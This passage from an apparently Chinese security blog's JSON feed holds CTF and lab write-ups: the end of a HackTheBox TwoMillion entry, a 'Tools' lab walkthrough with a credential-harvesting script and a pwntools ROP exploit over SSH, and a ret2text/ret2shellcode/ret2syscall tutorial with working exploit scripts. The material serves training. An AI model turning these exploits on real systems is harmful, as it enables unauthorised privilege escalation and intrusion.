41415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D\"}\n```\n\n可以通过这个步骤来揭秘\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image18.png)\n\n```bash\nDear HackTheBox Community,\n\nWe are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.\n\nFrom the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.\n\nTo each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.\n\nHere's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.\n\nWith deepest gratitude,\n\nThe HackTheBox Team\n```",
            "url": "https://www.sunsetaction.top/2025/06/21/HackTheBoxMachine - TwoMillion",
            "title": "HackTheBox - Machine - TwoMillion",
            "summary": "Machine TwoMillion https://app.hackthebox.com/machines/TwoMillion | Linux | Eas Recon 访问 HTTP 服务，采集指纹，是介绍 HackTheBox 网站 有一个登录页 注册需要拿到邀请码 通过目录扫描能扫描到另外一...",
            "date_modified": "2025-06-21T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HackTheBox",
                "Linux",
                "FUZZ",
                "CVE-2023-0386"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/06/16/群U靶机Tools",
            "content_html": "\n# Tools\n\n## Recon\n\n端口扫描\n\n```bash\n➜  ~ nmap -sT -min-rate 5000 192.168.56.82\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 15:51 CST\nNmap scan report for 192.168.56.82\nHost is up (0.00058s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:43:CC:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.24 seconds\n```\n\n## 爆破 1337\n\n访问`80`端口提示\n\n![image.png](/post-images/群U靶机Tools/image.png)\n\n`1337` 端口是要我们输入什么\n\n```bash\n➜  ~ nc 192.168.56.82 1337\nPlease input [152]: 152\nPlease input [921]: 921\nPlease input [441]: 441\nPlease input [105]: 105\nPlease input [534]: 534\nPlease input [192]: 192\nPlease input [626]: 626\nPlease input [968]: 968\nPlease input [674]: 674\nPlease input [494]: 494\nPlease input [768]: 768\nPlease input [808]: 808\nPlease input [365]: 365\nPlease input [438]: 438\nPlease input [975]: 975\nPlease input [165]: 165\nPlease input [796]: 796\nPlease input [892]:\n```\n\n`AI` 脚本直接爆破\n\n```bash\nimport socket\nimport re\nimport time\n\n# --- 配置 ---\nHOST = '192.168.56.82'  # 目标服务器 IP 地址\nPORT = 1337  # 目标服务器端口\n# ------------\n\n# 正则表达式，用于从文本中提取方括号内的数字\npattern = re.compile(r\"\\[(\\d+)\\]\")\n\n# 定义一个函数，从socket中读取数据，直到遇到特定的分隔符\ndef read_until(sock, delimiter):\n    \"\"\"从 sock 中读取数据，直到接收到 delimiter 为止\"\"\"\n    data = b\"\"\n    while not data.endswith(delimiter):\n        try:\n            # 一次只读取一个字节，避免读取过多内容\n            chunk = sock.recv(1)\n            if not chunk:  # 如果连接关闭，recv会返回空字节串\n                return data  # 返回已接收的数据\n            data += chunk\n        except socket.timeout:\n            # 如果发生超时，也返回已接收的数据\n            print(\"\\n[!] 读取超时\")\n            return data\n    return data\n\ntry:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        # 设置一个超时，防止脚本在任何recv操作上永久卡住\n        s.settimeout(3)\n        print(f\"[*] 连接到 {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] 连接成功！\")\n\n        while True:\n            # 读取服务器的提示，直到 \": \" 出现\n            # 我们用 b': ' 是因为它是一个字节字符串\n            prompt_bytes = read_until(s, b': ')\n\n            # 如果读取到的数据为空，说明连接可能已断开\n            if not prompt_bytes:\n                print(\"\\n[*] 连接已关闭。\")\n                break\n\n            # 将字节解码为字符串以便处理\n            prompt_str = prompt_bytes.decode('utf-8')\n            print(f\"[<] 收到: {prompt_str}\", end='')  # 用 end='' 避免打印多余的换行\n\n            # 在收到的提示中查找数字\n            match = pattern.search(prompt_str)\n\n            if match:\n                # 提取数字\n                number_to_send = match.group(1)\n\n                # 准备要发送的数据（数字 + 换行符）\n                response = (number_to_send + '\\n').encode('utf-8')\n\n                print(f\" [>] 发送: {number_to_send}\")  # 在同一行打印发送内容\n\n                # 发送响应\n                s.sendall(response)\n\n                # 短暂延迟，有时可以避免竞态条件\n                time.sleep(0.1)\n            else:\n                # 如果在提示中没有找到数字，说明挑战结束了\n                print(\"\\n\\n[*] 未找到挑战数字，假定挑战已完成。\")\n                print(\"[*] 服务器最终响应：\")\n                print(\"====================================\")\n                print(prompt_str.strip())  # 打印我们已收到的部分\n\n                # 尝试再多接收一些数据，因为flag可能跟在后面\n                try:\n                    final_data = s.recv(4096).decode('utf-8').strip()\n                    if final_data:\n                        print(final_data)\n                except socket.timeout:\n                    pass  # 没有更多数据是正常的\n\n                print(\"====================================\")\n                break\n\nexcept ConnectionRefusedError:\n    print(f\"[!] 连接被拒绝。请检查 IP ({HOST}) 和端口 ({PORT})。\")\nexcept socket.timeout:\n    print(\"[!] 连接超时。服务器没有在规定时间内响应。\")\nexcept Exception as e:\n    print(f\"[!] 发生未知错误: {e}\")\n\nprint(\"[*] 脚本执行完毕。\")\n\n```\n\n得到凭据 `welcome`:`learnpwntools`\n\n```bash\n[<] 收到: Please input [407]:  [>] 发送: 407\n[<] 收到: Please input [510]:  [>] 发送: 510\n[<] 收到: user/pass:welcome/learnpwntools\n```\n\n## 缓冲区溢出\n\n查看 `sudo` 权限\n\n```bash\nwelcome@Tools:~$ sudo -l\nMatching Defaults entries for welcome on Tools:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser welcome may run the following commands on Tools:\n    (ALL) NOPASSWD: /opt/find_backdoor\n```\n\n运行，发现会有 `Segmentation fault`\n\n```bash\nwelcome@Tools:~$ /opt/find_backdoor       \nplease input                                      \n111111111111111111111111111                                                                                       \nok,bye!!!111111111111111111111111111                                                                              \nok,bye!!!                                                                                                         \nSegmentation fault \n```\n\n拉出来反编译一看存在缓存区溢出漏洞\n\n![image.png](/post-images/群U靶机Tools/image1.png)\n\n查看安全机制，裸奔\n\n```bash\nwelcome@Tools:~$ file /opt/find_backdoor \n/opt/find_backdoor: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1c72ddcad651c7f35bb655e0ddda5ecbf8d31999, not stripped\nwelcome@Tools:~$ checksec /opt/find_backdoor \n[*] '/opt/find_backdoor'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX unknown - GNU_STACK missing\n    PIE:        No PIE (0x400000)\n    Stack:      Executable\n    RWX:        Has RWX segments\n    Stripped:   No\n```\n\n`shift+F12`查看字符串，存在 `/bin/sh`\n\n![image.png](/post-images/群U靶机Tools/image2.png)\n\n查看 `plt` ，有`system`函数，可以直接用\n\n```bash\npwndbg> plt\nSection .plt 0x401020 - 0x401060:\n0x401030: puts@plt\n0x401040: system@plt\n0x401050: gets@plt\n```\n\n有 `system` 和 `/bin/sh` ，直接梭哈\n\n计算偏移值，得到`23`\n\n```bash\n➜  ttt /usr/bin/msf-pattern_create -l 200\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag\n```\n\n```bash\npwndbg> x/xg 0x7fffffffdf58\n0x7fffffffdf58: 0x3765413665413565\n```\n\n```bash\n(pwn) ➜  ttt /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        \n[*] Exact match at offset 23\n```\n\n拿一下需要用到的地址\n\n```bash\nwelcome@Tools:~$ ROPgadget --binary /opt/find_backdoor --string \"/bin/sh\"\nStrings information\n============================================================\n0x000000000040201b : /bin/sh\n```\n\n```\nwelcome@Tools:~$ ROPgadget --binary /opt/find_backdoor --only \"pop|ret\"\nGadgets information\n============================================================\n0x00000000004011fb : pop rdi ; ret\n```\n\n```bash\nwelcome@Tools:~$ ROPgadget --binary /opt/find_backdoor --only \"pop|ret\"\nGadgets information\n============================================================\n0x0000000000401016 : ret\n```\n\n编写利用脚本\n\n```bash\nfrom pwn import *\nr = ssh(host='192.168.56.82', user='welcome', password='learnpwntools')\np = r.process(['sudo', '/opt/find_backdoor']) \nsystem_addr = 0x401040\nbin_sh_addr = 0x000000000040201b\npop_rdi_addr = 0x00000000004011fb\nret = 0x0000000000401016\n\npayload = b'A' * 23 + p64(ret) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\np.sendlineafter(b'please input',payload)\np.interactive()\n```\n\n```bash\n    IBT:      Disabled\n[+] Starting remote process None on 192.168.56.82: pid 1105\n[!] ASLR is disabled for '/opt/find_backdoor'!\n[*] Switching to interactive mode\n\nAAAAAAAAAAAAAAAAAAAAAAA\\x16\\x10@\nok,bye!!!\n$ $ whoami\nwelcome\n```\n\n![image.png](/post-images/群U靶机Tools/image3.png)\n\n![image.png](/post-images/群U靶机Tools/image4.png)",
            "url": "https://www.sunsetaction.top/2025/06/16/群U靶机Tools",
            "title": "群U靶机 - Tools",
            "summary": "Tools Recon 端口扫描 爆破 1337 访问80端口提示 1337 端口是要我们输入什么 AI 脚本直接爆破 得到凭据 welcome:learnpwntools 缓冲区溢出 查看 sudo 权限 运行，发现会有 Segmentation fault 拉出来反编译一看存在缓存区溢出漏洞 查...",
            "date_modified": "2025-06-16T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "PWN",
                "ROP",
                "ret2text",
                "Crack"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/06/15/PWN - 基本ROP",
            "content_html": "\n# PWN - 基本ROP\n\n> https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/\n> \n\n这里用到的所有题目：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/\n\n`HackTheBox - Ellingson` 碰到缓冲区溢出，无从下手，故有此篇\n\n## ret2text\n\n`ret2text` 即控制程序执行程序本身已有的的代码 (即， `.text` 段中的代码) \n\n收查看程序保护机制\n\n```bash\n➜  ret2text checksec ret2text          \n[*] '/root/Desktop/Test/StackBufferOverFlow/ret2text/ret2text'\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n```\n\n仅仅开启`NX` ，并且是 `32` 位程序\n\n![image.png](/post-images/PWN%20-%20基本ROP/image.png)\n\n`gets`函数，很明显存在缓冲区溢出漏洞，并且没有做边界保护\n\n并且`secure`函数中有 `/bin/sh` \n\n```bash\nvoid secure()\n{\n  unsigned int v0; // eax\n  int input; // [esp+18h] [ebp-10h] BYREF\n  int secretcode; // [esp+1Ch] [ebp-Ch]\n\n  v0 = time(0);\n  srand(v0);\n  secretcode = rand();\n  __isoc99_scanf(&unk_8048760, &input);\n  if ( input == secretcode )\n    system(\"/bin/sh\");\n}\n```\n\n定位`system`函数\n\n```bash\npwndbg> disas secure\nDump of assembler code for function secure:\n   0x080485fd <+0>:     push   ebp\n   0x080485fe <+1>:     mov    ebp,esp\n   0x08048600 <+3>:     sub    esp,0x28\n   0x08048603 <+6>:     mov    DWORD PTR [esp],0x0\n   0x0804860a <+13>:    call   0x8048470 <time@plt>\n   0x0804860f <+18>:    mov    DWORD PTR [esp],eax\n   0x08048612 <+21>:    call   0x80484b0 <srand@plt>\n   0x08048617 <+26>:    call   0x80484e0 <rand@plt>\n   0x0804861c <+31>:    mov    DWORD PTR [ebp-0xc],eax\n   0x0804861f <+34>:    lea    eax,[ebp-0x10]\n   0x08048622 <+37>:    mov    DWORD PTR [esp+0x4],eax\n   0x08048626 <+41>:    mov    DWORD PTR [esp],0x8048760\n   0x0804862d <+48>:    call   0x80484f0 <__isoc99_scanf@plt>\n   0x08048632 <+53>:    mov    eax,DWORD PTR [ebp-0x10]\n   0x08048635 <+56>:    cmp    eax,DWORD PTR [ebp-0xc]\n   0x08048638 <+59>:    jne    0x8048646 <secure+73>\n   0x0804863a <+61>:    mov    DWORD PTR [esp],0x8048763\n   0x08048641 <+68>:    call   0x8048490 <system@plt>\n   0x08048646 <+73>:    leave\n   0x08048647 <+74>:    ret\nEnd of assembler dump.\n```\n\n在`0x0804863a`处\n\n接下来计算偏移量，使用 `pwndbg`\n\n反编译`main`找到`gets` `0x080486ae`\n\n```bash\npwndbg> disas main\nDump of assembler code for function main:\n   0x08048648 <+0>:     push   ebp\n   0x08048649 <+1>:     mov    ebp,esp\n   0x0804864b <+3>:     and    esp,0xfffffff0\n   0x0804864e <+6>:     add    esp,0xffffff80\n   0x08048651 <+9>:     mov    eax,ds:0x804a060\n   0x08048656 <+14>:    mov    DWORD PTR [esp+0xc],0x0\n   0x0804865e <+22>:    mov    DWORD PTR [esp+0x8],0x2\n   0x08048666 <+30>:    mov    DWORD PTR [esp+0x4],0x0\n   0x0804866e <+38>:    mov    DWORD PTR [esp],eax\n   0x08048671 <+41>:    call   0x80484d0 <setvbuf@plt>\n   0x08048676 <+46>:    mov    eax,ds:0x804a040\n   0x0804867b <+51>:    mov    DWORD PTR [esp+0xc],0x0\n   0x08048683 <+59>:    mov    DWORD PTR [esp+0x8],0x1\n   0x0804868b <+67>:    mov    DWORD PTR [esp+0x4],0x0\n   0x08048693 <+75>:    mov    DWORD PTR [esp],eax\n   0x08048696 <+78>:    call   0x80484d0 <setvbuf@plt>\n   0x0804869b <+83>:    mov    DWORD PTR [esp],0x804876c\n   0x080486a2 <+90>:    call   0x8048480 <puts@plt>\n   0x080486a7 <+95>:    lea    eax,[esp+0x1c]\n   0x080486ab <+99>:    mov    DWORD PTR [esp],eax\n   0x080486ae <+102>:   call   0x8048460 <gets@plt>\n   0x080486b3 <+107>:   mov    DWORD PTR [esp],0x80487a4\n   0x080486ba <+114>:   call   0x8048450 <printf@plt>\n   0x080486bf <+119>:   mov    eax,0x0\n   0x080486c4 <+124>:   leave\n   0x080486c5 <+125>:   ret\nEnd of assembler dump.\n```\n\n在`gets`处设置断点\n\n```bash\npwndbg> b *0x080486ae\nBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.\n```\n\n`run`然后观察栈帧\n\n```bash\npwndbg> run                 \nStarting program: /root/Desktop/Test/StackBufferOverFlow/ret2text/ret2text \nwarning: Unable to find libthread_db matching inferior''s thread library, thread debugging will not be available.\nThere is something amazing here, do you know anything?\n                                                         \nBreakpoint 1, 0x080486ae in main () at ret2text.c:24\nwarning: 24     ret2text.c: No such file or directory\nWarning: Avoided exploring possible address 0xfffdade8.                                                                                                                                                                             \nYou can explicitly explore it with `vmmap-explore 0xfffda000`\nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA\n───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────\n EAX  0xffffcfac ◂— 0   \n EBX  0xf7f9ae14 ◂— 0x232d0c /* '\\x0c-#' */                                                                                                                                                                                         \n ECX  0xf7f9c8e0 ◂— 0\n EDX  0\n EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0\n ESI  0x80486d0 (__libc_csu_init) ◂— push ebp\n EBP  0xffffd018 ◂— 0\n ESP  0xffffcf90 —▸ 0xffffcfac ◂— 0\n EIP  0x80486ae (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8\n```\n\n可以看到`EBP` =`0xffffd018` ，`ESP` =`0xffffcfa`\n\n```bash\npwndbg> p/d 0xffffd018 - 0xffffcfac\n$1 = 108\n```\n\n编写`exp`  \n\n```bash\n(pwn) ➜  ret2text cat exp.py\nfrom pwn import *\n\nsh = process('./ret2text')\ntarget = 0x0804863a\npayload = b'A' * 112 + p32(target)\nsh.sendline(payload)\nsh.interactive()\n```\n\n```bash\n(pwn) ➜  ret2text python exp.py\n[+] Starting local process './ret2text': pid 3343\n[*] Switching to interactive mode\nThere is something amazing here, do you know anything?\nMaybe I will tell you next time !$ whoami\nroot\n$  \n```\n\n## **ret2shellcode**\n\n`ret2shellcode`，即控制程序执行 `shellcode` 代码。通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码。\n查看保护机制，未开启任何保护\n\n```bash\n➜  ret2shellcode checksec ret2shellcode \n[*] '/root/Desktop/Test/StackBufferOverFlow/ret2shellcode/ret2shellcode'\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX unknown - GNU_STACK missing\n    PIE:        No PIE (0x8048000)\n    Stack:      Executable\n    RWX:        Has RWX segments\n    Stripped:   No\n    Debuginfo:  Yes\n```\n\n依旧是`gets` ，存在缓冲区溢出漏洞\n\n![image.png](/post-images/PWN%20-%20基本ROP/image1.png)\n\n但是这次并没有其他函数，也没有 `/bin/sh` 的身影\n\n这里使用`strncpy`将`s`传递到`buf2`\n\n![image.png](/post-images/PWN%20-%20基本ROP/image2.png)\n\n我们调试一下程序，查看`bss`区域是否拥有读写权限\n\n![image.png](/post-images/PWN%20-%20基本ROP/image3.png)\n\n```bash\n 0x804a000  0x804b000 rw-p     1000   1000 ret2shellcode\n```\n\n那么思路就是：`shellcode +（偏移值 - len(shellcode)）* A  + buf2add`\n\n计算偏移量\n\n首先生成`200`长度但是每一段都是唯一的字符\n\n```bash\npwndbg> cyclic 200\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n```\n\n![image.png](/post-images/PWN%20-%20基本ROP/image4.png)\n\n返回地址被`daab` 覆盖上去了，再计算偏移量\n\n```bash\npwndbg> cyclic -l daab\nFinding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)\nFound at offset 112\n```\n\n偏移量和`buf2`地址我们都知道了，直接编写`payload`\n\n```bash\nfrom pwn import *\nshellcode = asm(shellcraft.sh())\nshellcode_pad = shellcode + (112 - (len(shellcode))) * b'A'\nbuf2_add = 0x804a080\nsh = process('./ret2shellcode')\nsh.sendline(shellcode_pad + p32(buf2_add))\nsh.interactive()\n```\n\n```bash\nroot@sunset-virtual-machine:~# python3 exp.py \n[+] Starting local process './ret2shellcode': pid 58718\n[*] Switching to interactive mode\nNo system for you this time !!!\nbye bye ~$ id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n## **ret2syscall**\n\n`ret2syscall`，即控制程序执行系统调用，获取 `shell`。\n\n查看程序，`32`位，静态程序，没有使用动态链接库\n\n```bash\n➜  ret2syscall file ret2syscall \nret2syscall: ELF 32-bit LSB executable, Intel i386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped\n```\n\n查看保护机制，栈不可执行，无法使用`ret2shellcode`\n\n```bash\n➜  ret2syscall checksec ret2syscall            \n[*] '/root/Desktop/Test/StackBufferOverFlow/ret2syscall/ret2syscall'\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n```\n\n这里还涉及到系统调用，一般我们通过一下系统调用来获得`shell`\n\n```bash\nexecve(\"/bin/sh\",NULL,NULL)\n```\n\n当遇到`32`位程序时，需要使得：\n\n- 系统调用号，即 eax 应该为 `0xb`（`0xb` 为 `execve` 对应的系统调用号）也就是`11`\n- 第一个参数，即 ebx 应该指向 `/bin/sh` 的地址，其实执行 sh 的地址也可以。\n- 第二个参数，即 ecx 应该为 `0`\n- 第三个参数，即 edx 应该为 `0`\n\n最后将系统调用和参数都填入寄存器后，我们再让系统触发 `0x80` 号中断（`int 0x80`）\n\n`Linux`对系统调用的调用必须通过执行`int $0x80`汇编指令，这条指令会产生向量为`128`的编程异常\n\nIDA 反编译程序，依旧是`gets` ，存在缓冲区溢出漏洞\n\n![image.png](/post-images/PWN%20-%20基本ROP/image5.png)\n\n`shift` + `F12` 查看程序字符串，能看到 `/bin/sh` 我们刚好可以利用\n\n![image.png](/post-images/PWN%20-%20基本ROP/image6.png)\n\n但是因为开启了 `NX` 我们无法往栈上写，写了也无法执行，也不存在`system(\"/bin/sh\")` 代码段，程序是静态的，所以 `ret2shellcode` `ret2text` `ret2libc` 都无法使用，但是存在`/bin/sh` 代码片段，所以我们可以尝试 `ret2syscall`\n\n通过`ROPgadget` 查找需要用到寄存器指令\n\n`pop eax ; ret` 地址为 `0x080bb196`\n\n```bash\n➜  ret2syscall ROPgadget --binary ret2syscall --only \"pop|ret\" | grep eax\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n**0x080bb196 : pop eax ; ret**\n0x0807217a : pop eax ; ret 0x80e\n0x0804f704 : pop eax ; ret 3\n0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret\n```\n\n发现一串连续的将`ebx~edx`弹出的`pop edx ; pop ecx ; pop ebx ; ret` ，地址为`0x0806eb90`\n\n```bash\n➜  ret2syscall ROPgadget --binary ret2syscall --only \"pop|ret\" | grep ebx\n0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret\n0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret\n0x080be23f : pop ebx ; pop edi ; ret\n0x0806eb69 : pop ebx ; pop edx ; ret\n0x08092258 : pop ebx ; pop esi ; pop ebp ; ret\n0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10\n0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14\n0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc\n0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4\n0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8\n0x08048913 : pop ebx ; pop esi ; pop edi ; ret\n0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4\n0x08049a94 : pop ebx ; pop esi ; ret\n0x080481c9 : pop ebx ; ret\n0x080d7d3c : pop ebx ; ret 0x6f9\n0x08099c87 : pop ebx ; ret 8\n0x0806eb91 : pop ecx ; pop ebx ; ret\n0x0806336b : pop edi ; pop esi ; pop ebx ; ret\n**0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret**\n```\n\n命令字段 `0x080be408` 地址\n\n```bash\n➜  ret2syscall ROPgadget --binary ret2syscall --string \"/bin/sh\"         \nStrings information\n============================================================\n0x080be408 : /bin/sh\n```\n\n中断代码地址 `0x08049421`\n\n```bash\n➜  ret2syscall ROPgadget --binary ret2syscall --only \"int\"   \nGadgets information\n============================================================\n0x08049421 : int 0x80\n0x080890b5 : int 0xcf\n```\n\n计算偏移量，为`112`\n\n```bash\npwndbg> cyclic 200\naaaabaaacaaa...waabxaabyaab\n\npwndbg> run\nStarting program: /root/Desktop/Test/StackBufferOverFlow/ret2syscall/ret2syscall \nThis time, no system() and NO SHELLCODE!!!\nWhat do you plan to do?\naaaabaaacaaadaaaeaaafaaagaaaabuaabvaabwaabxaabyaab\n\nProgram received signal SIGSEGV, Segmentation fault.                  \n0x62616164 in ?? ()                                                                                               \nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA                                                                  \n───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─\n ECX  0xfbad2288                                                                                                  \n EDX  0x80eb4e0 (_IO_stdfile_0_lock) ◂— 0                                                                         \n EDI  0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8067b10 (__stpcpy_sse2) ◂— mov edx, dword ptr [esp + 4]\n ESI  0             \n ESP  0xffffd100 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'\n EIP  0x62616164 ('daab')\n─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────\nInvalid address 0x62616164\n\npwndbg> cyclic -l daab\nFinding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)\nFound at offset 112\n```\n\n使用代码块绘制的利用链\n\n```bash\n           |-----------------------------| 高地址\n           | ...                         |\n           |-----------------------------|\n           | int_0x80_addr               |  <-- ret from pop_..._ret\n           |-----------------------------|\n           | bin_sh_addr                 |  <-- pop into ebx\n           |-----------------------------|\n           | 0x0                         |  <-- pop into ecx\n           |-----------------------------|\n           | 0x0                         |  <-- pop into edx\n           |-----------------------------|\n           | pop_edx_ecx_ebx_ret_addr    |  <-- ret from pop_eax_ret\n           |-----------------------------|\n           | 0xb                         |  <-- pop into eax\n           |-----------------------------|\n           | pop_eax_ret_addr            |  <-- Overwritten return address\n   ebp     |-----------------------------|\n           | ...                         |\n           |-----------------------------|\n   buf ->  | gets buffer start           |\n   esp     |-----------------------------| 低地址\n```\n\n编写`EXP`\n\n```bash\nfrom pwn import *\n\npop_eax_ret_addr = 0x080bb196\npop_edx_ecx_ebx_addr = 0x0806eb90\nbin_sh_addr = 0x080be408\nint_0x80_addr = 0x08049421\n\nsh = process('./ret2syscall')\nsh.sendline(b'A'*112 + p32(pop_eax_ret_addr) + p32(0xb) + p32(pop_edx_ecx_ebx_addr) + p32(0) + p32(0) + p32(bin_sh_addr) + p32(int_0x80_addr))\nsh.interactive()\n```\n\n```bash\n(pwn) ➜  ret2syscall python exp.py\n[+] Starting local process './ret2syscall': pid 2825\n[*] Switching to interactive mode\nThis time, no system() and NO SHELLCODE!!!\nWhat do you plan to do?\n$ whoami\nroot\n```\n\n## ret2libc\n\n`ret2libc` 即控制函数的执行 `libc` 中的函数，通常是返回至某个函数的 `plt` 处或者函数的具体位置 (即函数对应的 `got` 表项的内容)。\n\n其中 `libc` 指的是`C` 标准库（`standard C library`）的实现，通常是 `/lib/x86_64-linux-gnu/libc.so.6` 或 `/lib/i386-linux-gnu/libc.so.6`\n\n`libc`库是`Linux`下的`C`函数库，而`libc`库中存放的就是这些函数的偏移地址，所以只要确定了`libc`库的版本，就能知道函数的偏移地址，但是我们这里在本地运行的样本，所以可以直接忽视。\n\n### ret2libc1\n\n使用 IDA 反编译，`gets`存在缓冲区溢出漏洞\n\n![image.png](/post-images/PWN%20-%20基本ROP/image7.png)\n\n`secure` 中的 `system`被修改了，所以无法使用`ret2text`\n\n![image.png](/post-images/PWN%20-%20基本ROP/image8.png)\n\n`32` 位程序，并且调用动态链接库\n\n```bash\n➜  ret2libc file ret2libc1         \nret2libc1: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped\n```\n\n`NX` 启动，所以`ret2shellcode` 也无法使用\n\n```bash\n➜  ret2libc checksec ret2libc1 \n[*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc1'\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No 